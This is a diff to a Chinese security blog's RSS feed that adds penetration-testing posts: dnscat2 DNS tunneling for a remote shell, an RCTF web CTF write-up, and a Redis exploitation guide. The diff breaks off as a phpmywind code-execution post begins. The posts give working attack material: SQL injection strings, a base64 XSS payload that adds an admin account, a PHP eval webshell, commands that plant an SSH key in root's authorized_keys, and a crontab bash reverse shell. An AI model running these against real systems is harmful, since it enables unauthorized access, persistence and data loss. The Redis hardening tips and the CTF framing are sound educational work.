@@ -5,8 +5,8 @@
     <description>Something Specail</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Fri, 24 Mar 2017 22:28:51 +0800</pubDate>
-    <lastBuildDate>Fri, 24 Mar 2017 22:28:51 +0800</lastBuildDate>
+    <pubDate>Mon, 17 Apr 2017 01:32:11 +0800</pubDate>
+    <lastBuildDate>Mon, 17 Apr 2017 01:32:11 +0800</lastBuildDate>
     <generator>Jekyll v3.4.2</generator>
     
       <item>
@@ -284,6 +284,1371 @@ impacket&lt;/p&gt;
         <guid isPermaLink="true">http://localhost:4000/2017/03/20/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%9D%82%E8%B0%88.html</guid>
         
         <category>pentest</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>通过DNS协议绕过防火墙</title>
+        <description>&lt;p&gt;工具&lt;/p&gt;
+
+&lt;p&gt;[https://github.com/iagox86/dnscat2][1]&lt;/p&gt;
+
+&lt;p&gt;测试环境&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ubuntu 14.04 root用户
+windows7 x64 user用户
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;0x01环境准备&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apt-get update
+apt-get -y install ruby-dev git make g++
+gem install bundler
+git clone https://github.com/iagox86/dnscat2.git
+cd dnscat2/server
+#修改Gemfile source 'https://ruby.taobao.org/'
+bundle install
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;或者通过docker安装&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apt-get install docker.io
+service docker status
+service docker start
+cd ~/dnscat2/server
+#修改Gemfile source 'https://ruby.taobao.org/'
+docker build .
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;安装完成之后，可能在docker images 看到这个镜像没有名字，我们修改一下 docker tag IMAGEID  mpercival/dnscat2&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;0x02利用过程&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;server端&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd dnscat2/server
+ruby ./dnscat2.rb
+#docker用户  docker run -p 53:53/udp -it --rm mpercival/dnscat2 ruby ./dnscat2.rb
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-2841831801.png&quot; alt=&quot;2841831801&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;可以通过两种方式设置C&amp;amp;C地址，如果没有域名的话，直接在外网VPS运行ruby ./dnscat2.rb 有域名的童鞋，先设置好NS服务器将NS记录修改为当前的机器。然后通过ruby ./dnscat2.rb yourdomain 我这里使用的IP地址&lt;/p&gt;
+
+&lt;p&gt;client端&lt;/p&gt;
+
+&lt;p&gt;将dnscat2文件夹下面的client编译好成exe，然后上传到client端&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dnscat2.exe --dns=server=server端ip --secret=c2c6d04cab68ee2947d80316858da0f8
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-3501735141.png&quot; alt=&quot;3501735141&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;由于在新版本的dnscat2是加密的所以我们在客户端执行的时候要加上秘钥，不然无法正确的建立连接
+&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-197873402.png&quot; alt=&quot;197873402&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;获取shell&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;session -i 1 #切换到session 1
+help #通过help可以看到支持的命令
+shell  #执行之后会新生成一个session  需要通过session -i 2 切过去
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-842306562.png&quot; alt=&quot;842306562&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;这样就成功获取了一个shell，我们可以通过数据包看一下&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-3078174618.png&quot; alt=&quot;3078174618&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;数据都是通过DNS发出去的，并且是加密过的，因为在最初的dnscat2的版本中，数据只是简单的hex编码。到最新版的默认就已经加密&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-2981816537.png&quot; alt=&quot;2981816537&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;通过Salsa20加密算法进行了加密，如果不知道秘钥，就几乎不能解密数据包了。除了普通的反弹shell和上传下载文件功能，还有一个比较有用的功能
+可以通过dnscat2实现DNS隧道，然后进行内网渗透。在成功获取一个session之后执行&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;session -i id
+listen 4444 10.211.55.19:22 #将内网10.211.55.19的22端口转发到本地的4444
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-2557060718.png&quot; alt=&quot;2557060718&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;然后直接ssh本地的ip的4444端口&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-2093290607.png&quot; alt=&quot;2093290607&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;注意的是我用的docker环境，所以是直接ssh的docker的ip&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;0x03参考&lt;/strong&gt;
+&lt;a href=&quot;https://github.com/iagox86/dnscat2/&quot;&gt;https://github.com/iagox86/dnscat2&lt;/a&gt;
+&lt;a href=&quot;https://zeltser.com/c2-dns-tunneling/&quot;&gt;https://zeltser.com/c2-dns-tunneling/&lt;/a&gt;&lt;/p&gt;
+
+</description>
+        <pubDate>Fri, 03 Jun 2016 00:00:00 +0800</pubDate>
+        <link>http://localhost:4000/penetration/2016/06/03/%E9%80%9A%E8%BF%87DNS%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87%E9%98%B2%E7%81%AB%E5%A2%99.html</link>
+        <guid isPermaLink="true">http://localhost:4000/penetration/2016/06/03/%E9%80%9A%E8%BF%87DNS%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87%E9%98%B2%E7%81%AB%E5%A2%99.html</guid>
+        
+        <category>penetration</category>
+        
+        
+        <category>penetration</category>
+        
+      </item>
+    
+      <item>
+        <title>RCTF-writeup[web]</title>
+        <description>&lt;p&gt;&lt;strong&gt;upload&lt;/strong&gt;
+看起来是一个上传题，其实这是一个注入题。在文件名的地方存在注入。因为注入点是insert的，如果直接进行报错注入或者延时注入的话会提示sqlinject find。我们可以利用二次注入，来得到数据。通过fuzz发现，在进行insert操作的时候有三个列，所以构造&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;文件名','uid','uid'),((database()),'uid','uid')#.jpg
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;就可以看到回显的数据，然后通过走流程就可以查询出flag，但是有一点要注意题目直接把select from 这些关键字过滤了两次所以得构造这样的selselectect才行。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;weeeeeb3&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;先注册一个帐号，然后找回密码，输入正确的信息。到第二步提示修改新的密码的时候，直接抓包把用户名修改为admin。然后就可以登陆admin这个帐号，然后在manage页面提示 not allow ip 我们把xxf改为127.0.0.1就可以绕过。然后要我们猜action 由于是filemanage就直接猜action＝upload 然后就出现一个上传页面，通过一轮fuzz，直接上传一个图片马，在后面写上&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;script lanaguage=&quot;php&quot;&amp;gt; phpinfo()&amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;把后缀改为php5 就成功拿到了flag。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;xss&lt;/strong&gt;
+这是一个留言板，通过fuzz发现过滤了很多标签，除此之外还把on事件直接给过滤了。后面测试发现可以使用link标签，然后使用sctf里面那种方法就可以弹框了。&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;link rel=&quot;import&quot; href=&quot;data:text/html;base64,PHNjcmlwdD5kZWxldGUgYWxlcnQ7YWxlcnQoIkhlbGxvIik7PC9zY3JpcHQ+&quot;&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-1170534972.jpg&quot; alt=&quot;xss-1.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;查看页面的html源码发现&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;!--only for admin
+&amp;lt;form action=&quot;&quot; method=&quot;post&quot;&amp;gt;
+username:&amp;lt;input type=&quot;text&quot; name=&quot;name&quot;&amp;gt;&amp;lt;br /&amp;gt;
+password:&amp;lt;input type=&quot;password&quot; name=&quot;pass&quot;&amp;gt;&amp;lt;br /&amp;gt;
+&amp;lt;input type=&quot;radio&quot; name=&quot;isadmin&quot; value=&quot;0&quot;&amp;gt;user
+&amp;lt;input type=&quot;radio&quot; name=&quot;isadmin&quot; value=&quot;1&quot;&amp;gt;admin&amp;lt;br /&amp;gt;
+&amp;lt;input type=&quot;hidden&quot; name=&quot;token&quot; value=&quot;34a1615ff3eaf616f7fa205a12792d27&quot;&amp;gt;
+&amp;lt;input type=&quot;submit&quot; name=&quot;adduser&quot; value=&quot;adduser&quot;&amp;gt;
+&amp;lt;/form&amp;gt;--&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;很明显啦，就是要添加一个管理帐号帐号，发现页面使用啦jquery直接添加帐号就行。&lt;/p&gt;
+
+&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//180.76.178.54:8004/4b79f5d4860384d4ac494ad91f5313b7/js/jquery.js&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ajax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;
+                               &lt;span class=&quot;na&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;post&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+                               &lt;span class=&quot;na&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+                               &lt;span class=&quot;na&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;name=tomato123&amp;amp;pass=tomato123&amp;amp;isadmin=1&amp;amp;adduser=adduser&amp;amp;token=&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;input[name=token]&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()})&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/script&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;然后构造payload&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;link rel=&quot;import&quot; href=&quot;data:text/html;base64,PHNjcmlwdCBzcmM9aHR0cDovLzE4MC43Ni4xNzguNTQ6ODAwNC80Yjc5ZjVkNDg2MDM4NGQ0YWM0OTRhZDkxZjUzMTNiNy9qcy9qcXVlcnkuanM+PC9zY3JpcHQ+CjxzY3JpcHQ+CiQuYWpheCh7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0eXBlOiAicG9zdCIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1cmw6ICIiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0YTogIm5hbWU9dG9tYXRvMTIzJnBhc3M9dG9tYXRvMTIzJmlzYWRtaW49MSZhZGR1c2VyPWFkZHVzZXImdG9rZW49IiskKCJpbnB1dFtuYW1lPXRva2VuXSIpLnZhbCgpfSkKPC9zY3JpcHQ+&quot;&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;添加了一个帐号密码为tomato123的管理员
+访问admin.php拿到flag&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-545225687.jpg&quot; alt=&quot;xss－2.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;easysql&lt;/strong&gt;
+注册一个aaa\然后在修改密码的页面可以发现报错&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-2913177276.jpg&quot; alt=&quot;easysql-1.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;可以看到是双引号，这明显是一个二次注入，然后重新构造语句发现不能含有空格。但是这并不影响，直接用括号代替就行了。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-157009057.jpg&quot; alt=&quot;easysql-2.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;然后爆出一个flag表，查询提示说flag not here，然后去查users里面的列名发现&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-3268258668.jpg&quot; alt=&quot;easysql－3.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;然后直接去查询里面的内容，发现只能出现RCTF这几个字符，然后就一直在纠结怎么查询，因为测试发现把substring left，right，reverse like 这些都拦截了。后面灵机一动想到了regexp。&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;username=tomato&quot;||updatexml(0x7c,concat((select(real_flag_1s_here)from(users)where(real_flag_1s_here)regexp('^R'))),1)#&amp;amp;password=tomato&amp;amp;email=tomato
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;然后成功搞定&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-1387239513.jpg&quot; alt=&quot;easysql－4.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;login&lt;/strong&gt;
+第二天给了提示说是nosql，那就猜是mongodb&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-3330162428.jpg&quot; alt=&quot;login-1.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;那就开始跑密码了。
+&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-3255963769.jpg&quot; alt=&quot;login－2.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;跑出的帐号密码为&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ROIS_ADMIN  pas5woRd_i5_45e2884c4e5b9df49c747e1d
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;然后登陆一发。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-460039838.jpg&quot; alt=&quot;login-3.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;下载备份文件，发现是一个php的解压zip的类，然后百度找到官方提供的，在diff一下&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-1149569489.jpg&quot; alt=&quot;login-4.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;还在html源码里面发现&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$Agent = $_SERVER['HTTP_USER_AGENT'];
+$backDoor = $_COOKIE['backdoor'];
+$msg = json_encode(&quot;no privilege&quot;);
+$iterations = 1000;
+$salt = &quot;roisctf&quot;;
+$alg = &quot;sha1&quot;;
+$keylen = &quot;20&quot;;
+if ($Agent == $backDoor || strlen($Agent) != 65) {
+    exit($msg);
+}
+if (substr($Agent,0,23) != &quot;rois_special_user_agent&quot;) {
+    exit($msg);
+}
+if (pbkdf2($alg, $Agent, $salt, $iterations, $keylen) != pbkdf2($alg, $backDoor, $salt, $iterations, $keylen)) {
+    exit($msg);
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;测试发现直接上传zip提示没有权限，然后只有过了上面三个条件才行。主要是第三个条件不好过，然后google一发
+pdkdf2 ctf&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://bl4ck.in/usr/uploads/2015/11/2664205826.jpg&quot; alt=&quot;login－5.jpg&quot; /&gt;
+&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-2664205826.jpg&quot; alt=&quot;2664205826&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;找到了这个 PBKDF2+HMAC collision
+然后在https://mathiasbynens.be/notes/pbkdf2-hmac
+这篇文章里面说到这个是可以碰撞的，就是不同的明文会出现相同的密文，然后用里面提供的脚本跑一发。成功跑出来一个&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rois_special_user_agentaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaamipvkd
+
+3-Rfm^Bq;ZZAcl]mS&amp;amp;eE
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;然后改一下ua，在cookie里面添加backdoor就可以成功上传了。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://bl4ck.in/usr/uploads/2015/11/2009859300.jpg&quot; alt=&quot;login－6.jpg&quot; /&gt;
+&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-2009859300.jpg&quot; alt=&quot;2009859300&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;按照解压出来的文件的命名规则为md5(文件名＋RoisFighting).文件的后缀
+但是访问http://180.76.178.54:8005/53a0fb1b692f02436c3b5dda1db9c361/upload/image/051ee28a1964f9f2779d32f2e48212cb/70d08f9380da3a6e0440b3266a2a39f6.php
+&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-2977300730.jpg&quot; alt=&quot;2977300730&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;文件并不存在，测试发现在解压后会直接删除文件，所以我们可以尝试构造一个解压到上级目录的shell&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-2977300730.jpg&quot; alt=&quot;login-7.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;shell地址就是
+http://180.76.178.54:8005/53a0fb1b692f02436c3b5dda1db9c361/upload/image/382aef24b11f8c5222bc58062a9bf5c7.php&lt;/p&gt;
+
+</description>
+        <pubDate>Tue, 17 Nov 2015 17:34:39 +0800</pubDate>
+        <link>http://localhost:4000/2015/11/17/RCTF-writeup-web.html</link>
+        <guid isPermaLink="true">http://localhost:4000/2015/11/17/RCTF-writeup-web.html</guid>
+        
+        <category>writeup</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>Redis安全总结</title>
+        <description>&lt;ol&gt;
+  &lt;li&gt;未授权访问&lt;/li&gt;
+  &lt;li&gt;获取webshell&lt;/li&gt;
+  &lt;li&gt;获取root&lt;/li&gt;
+  &lt;li&gt;通过redis提权&lt;/li&gt;
+  &lt;li&gt;其他的一些利用&lt;/li&gt;
+  &lt;li&gt;redis安全配置&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;测试环境 CentOS 6.5 x64
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;未授权访问&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;默认安装redis，其中启动权限就为root。并且是任意ip可以未授权访问。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-2276273468.jpg&quot; alt=&quot;2276273468&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-91190645.jpg&quot; alt=&quot;91190645&quot; /&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;&lt;strong&gt;获取webshell&lt;/strong&gt;
+条件：知道web绝对路径，redis运行的用户需要对web目录要有写的权限&lt;/p&gt;
+
+&lt;p&gt;http://10.211.55.10/phpinfo.php&lt;/p&gt;
+
+&lt;p&gt;然后通过客户端链接&lt;/p&gt;
+
+&lt;p&gt;redis-cli -h 10.211.55.10&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;config set dir /var/www/html/
+
+set shell &amp;lt;?php eval($_REQUEST[\'syclover\'])?&amp;gt;
+
+config set dbfilename syclover.php
+
+save
+
+exit
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;存在的问题,如果redis里面的数据量特别大并且前面存在&amp;lt;?php 之类的符号&lt;/p&gt;
+
+&lt;p&gt;先通过randomkey来查看键值之间的规律，然后可以将数据库备份下来，找到包含&amp;lt;?php 的键名，通过 keys *str*找到真正的键名，然后去修改这个键名。因为数据量很大所以备份的shell也很大，然后在生成shell的时候，可以设置不超时，并且在生成完成之后就退出。&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;&lt;strong&gt;获取root&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;victim server CentOS6.6+redis2.4  192.168.192.133
+
+attack server CentOS6.6  192.168.192.132
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;先在attack server生成一个公钥&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; ssh-keygen -t rsa -C &quot;redis&quot;
+(echo -e &quot;\n\n&quot;; cat redis.pub; echo -e &quot;\n\n&quot;) &amp;gt; redis.txt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;然后执行&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;redis-cli -h 192.168.192.133 flushall
+
+cat redis.txt | redis-cli -h 192.168.192.133 -x set pwn
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;登录redis  redis-cli -h 192.168.192.133&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;CONFIG set dir /root/.ssh/
+config set dbfilename &quot;authorized_keys&quot;
+save
+exit
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;然后就可以使用ssh的私钥登录了&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh -i redis.pub root@192.168.192.133
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-2436203329.png&quot; alt=&quot;2436203329&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;缺点：flushall 太暴力直接清空数据库，覆盖authorized_keys，导致原有的认证失效。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;通过redis提权&lt;/strong&gt;
+获取了一个webshell，但是权限很低，发现存在redis服务但是只能本地访问。然后通过上面的方法可以成功提权&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;&lt;strong&gt;其他玩法&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;redis+crontab&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;redis-cli config set dir /var/spool/cron/
+
+redis-cli config set dbfilename root
+
+echo -e &quot;\n\n*/1 * * * * bash -i &amp;gt;&amp;amp; /dev/tcp/127.0.0.1/8443 0&amp;gt;&amp;amp;1 \n\n&quot;|redis-cli -x set 1
+
+redis-cli save
+
+nc -lvv 8443
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;&lt;strong&gt;redis安全配置&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;设置只对本机开放  bind 127.0.0.1&lt;/li&gt;
+  &lt;li&gt;设置密码         requirepass tomato&lt;/li&gt;
+  &lt;li&gt;修改默认端口      12345&lt;/li&gt;
+  &lt;li&gt;低权限启动&lt;/li&gt;
+  &lt;li&gt;如果需要对外提供服务的话，设置iptables规则&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;strong&gt;参考&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://antirez.com/news/96&quot;&gt;http://antirez.com/news/96&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://zone.wooyun.org/content/23858&quot;&gt;http://zone.wooyun.org/content/23858&lt;/a&gt;&lt;/p&gt;
+
+</description>
+        <pubDate>Tue, 17 Nov 2015 00:00:00 +0800</pubDate>
+        <link>http://localhost:4000/2015/11/17/Redis%E5%AE%89%E5%85%A8%E6%80%BB%E7%BB%93.html</link>
+        <guid isPermaLink="true">http://localhost:4000/2015/11/17/Redis%E5%AE%89%E5%85%A8%E6%80%BB%E7%BB%93.html</guid>
+        
+        <category>penetration</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>phpmywind-v5.3任意代码执行</title>
+        <description>&lt;p&gt;&lt;strong&gt;测试环境&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wamp+phpmywind-v5.3
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
